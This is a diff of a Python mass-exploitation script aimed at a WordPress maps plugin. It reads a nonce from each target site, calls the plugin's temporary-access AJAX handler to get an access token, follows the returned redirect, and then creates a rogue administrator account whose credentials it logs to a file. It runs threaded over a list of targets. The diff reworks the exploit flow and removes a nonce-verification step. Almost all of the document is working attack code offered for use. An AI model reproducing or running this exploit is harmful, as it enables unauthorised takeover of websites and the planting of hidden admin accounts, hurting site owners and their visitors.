@@ -60,7 +60,7 @@ def get_nonce(url):
             match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
             if match:
                 nonce = match.group(1)
-                # Validate nonce format (typically alphanumeric, 10-32 chars)
+                # Validate nonce format (typically alphanumeric, 8-32 chars)
                 if re.match(r'^[a-zA-Z0-9]{8,}$', nonce):
                     return nonce
                 # Also accept hex format
@@ -92,40 +92,37 @@ def get_nonce(url):
                     return nonce
         
         return None
-    except Exception as e:
-        with print_lock:
-            print(f"[-] Error getting nonce from {url}: {str(e)}")
+    except Exception:
         return None
 
-def verify_nonce(url, nonce):
-    """Verify if the extracted nonce is valid by testing it"""
+def try_exploit_with_nonce(url, nonce):
+    """Attempt exploitation with the given nonce"""
+    ajax_url = url + "/wp-admin/admin-ajax.php"
+    payload = {
+        'action': 'wpgmp_temp_access_ajax',
+        'nonce': nonce,
+        'handler': 'wpgmp_temp_access_support',
+        'check_temp': 'false'
+    }
+
+    post_headers = HEADERS.copy()
+    post_headers.update({
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': url,
+        'Referer': url + '/',
+        'X-Requested-With': 'XMLHttpRequest'
+    })
+
     try:
-        ajax_url = url + "/wp-admin/admin-ajax.php"
-        test_payload = {
-            'action': 'wpgmp_temp_access_ajax',
-            'nonce': nonce,
-            'handler': 'wpgmp_temp_access_support',
-            'check_temp': 'false'
-        }
+        session = requests.Session()
+        session.headers.update(post_headers)
+        resp = session.post(ajax_url, data=payload, timeout=TIMEOUT, verify=False)
+        response_text = resp.text
+        token, redirect_url = extract_token_and_url(response_text)
         
-        headers = HEADERS.copy()
-        headers.update({
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-Requested-With': 'XMLHttpRequest'
-        })
-        
-        resp = requests.post(ajax_url, data=test_payload, headers=headers, 
-                           timeout=TIMEOUT, verify=False)
-        
-        # If we get a response (any response), nonce might be valid
-        # Check for specific vulnerability indicators
-        if resp.status_code == 200:
-            response_text = resp.text.lower()
-            if 'token' in response_text or 'access' in response_text:
-                return True, resp.text
-        return False, None
-    except Exception:
-        return False, None
+        return token, redirect_url, session, response_text
+    except Exception as e:
+        return None, None, None, str(e)
 
 def simpan_hasil(url, token, redirect_url=None):
     with file_lock:
@@ -138,7 +135,7 @@ def simpan_hasil(url, token, redirect_url=None):
                 f.write("\n")
         except IOError as e:
             with print_lock:
-                print("[-] Failed to write to output file: %s" % str(e))
+                print(f"[-] Failed to write to output file: {str(e)}")
 
 def simpan_admin(url, username, password, email):
     with file_lock:
@@ -152,7 +149,7 @@ def simpan_admin(url, username, password, email):
                 f.write("-------------------------------\n\n")
         except IOError as e:
             with print_lock:
-                print("[-] Failed to save admin info: %s" % str(e))
+                print(f"[-] Failed to save admin info: {str(e)}")
 
 def extract_token_and_url(response_text):
     """Extract token and URL from response with improved patterns"""
@@ -314,78 +311,47 @@ def check_vulnerability(url):
     
     if not nonce:
         with print_lock:
-            print(f"[-] {url} -> Failed to get nonce after multiple attempts")
+            print(f"[-] {url} -> Failed to get nonce, skipping...")
         return
 
     with print_lock:
-        print(f"[*] {url} -> Nonce obtained: {nonce[:8]}...")
+        print(f"[*] {url} -> Nonce obtained: {nonce[:8]}... (attempting exploitation)")
 
-    # Verify nonce before proceeding
-    is_valid, test_response = verify_nonce(url, nonce)
-    if not is_valid:
+    # Attempt exploitation directly with the extracted nonce
+    token, redirect_url, session, response = try_exploit_with_nonce(url, nonce)
+
+    if token:
         with print_lock:
-            print(f"[-] {url} -> Nonce verification failed")
-        return
+            print(f"[VULNERABLE] {url} -> Token obtained successfully")
+        simpan_hasil(url, token, redirect_url)
 
-    ajax_url = url + "/wp-admin/admin-ajax.php"
-    payload = {
-        'action': 'wpgmp_temp_access_ajax',
-        'nonce': nonce,
-        'handler': 'wpgmp_temp_access_support',
-        'check_temp': 'false'
-    }
-
-    post_headers = HEADERS.copy()
-    post_headers.update({
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': url,
-        'Referer': url + '/',
-        'X-Requested-With': 'XMLHttpRequest'
-    })
-
-    try:
-        session = requests.Session()
-        session.headers.update(post_headers)
-        resp = session.post(ajax_url, data=payload, timeout=TIMEOUT, verify=False)
-        response_text = resp.text
-        token, redirect_url = extract_token_and_url(response_text)
-
-        if token:
+        if redirect_url:
             with print_lock:
-                print(f"[VULNERABLE] {url} -> Token obtained successfully")
-            simpan_hasil(url, token, redirect_url)
+                print(f"[*] {url} -> Accessing redirect URL...")
+            try:
+                session.get(redirect_url, timeout=TIMEOUT, verify=False)
+            except:
+                pass
 
-            if redirect_url:
-                with print_lock:
-                    print(f"[*] {url} -> Accessing redirect URL...")
-                try:
-                    session.get(redirect_url, timeout=TIMEOUT, verify=False)
-                except:
-                    pass
-
-            # Attempt to create admin user
-            unique_username = f"{BASE_USERNAME}_{int(time.time())}"
-            success, message = create_admin_user(session, url, unique_username, NEW_PASSWORD, NEW_EMAIL)
-            if success:
-                with print_lock:
-                    print(f"[+] {url} -> Admin created: {unique_username} / {NEW_PASSWORD}")
-                simpan_admin(url, unique_username, NEW_PASSWORD, NEW_EMAIL)
-            else:
-                with print_lock:
-                    print(f"[-] {url} -> Failed to create admin: {message}")
+        # Attempt to create admin user
+        unique_username = f"{BASE_USERNAME}_{int(time.time())}"
+        success, message = create_admin_user(session, url, unique_username, NEW_PASSWORD, NEW_EMAIL)
+        if success:
+            with print_lock:
+                print(f"[+] {url} -> Admin created: {unique_username} / {NEW_PASSWORD}")
+            simpan_admin(url, unique_username, NEW_PASSWORD, NEW_EMAIL)
         else:
             with print_lock:
-                print(f"[-] {url} -> Vulnerability not exploitable (no token returned)")
-                
-            # Check if response indicates vulnerability despite no token
-            if 'error' not in response_text.lower() and response_text.strip():
-                with print_lock:
-                    print(f"[*] {url} -> Possible vulnerability but no token extracted")
-                    print(f"    Response: {response_text[:100]}...")
-
-    except Exception as e:
-        with print_lock:
-            print(f"[-] {url} -> Error: {str(e)}")
+                print(f"[-] {url} -> Failed to create admin: {message}")
+    else:
+        # Check response for clues even if no token found
+        if response and response != "None":
+            with print_lock:
+                print(f"[-] {url} -> No token extracted, but received response (length: {len(str(response))})")
+                # Don't fail, just continue
+        else:
+            with print_lock:
+                print(f"[-] {url} -> Not vulnerable or nonce invalid")
 
 def worker(q):
     while not q.empty():
@@ -394,7 +360,7 @@ def worker(q):
             check_vulnerability(target)
         except Exception as e:
             with print_lock:
-                print(f"[-] Worker error: {str(e)}")
+                print(f"[-] Worker error for {target}: {str(e)}")
         finally:
             q.task_done()
 
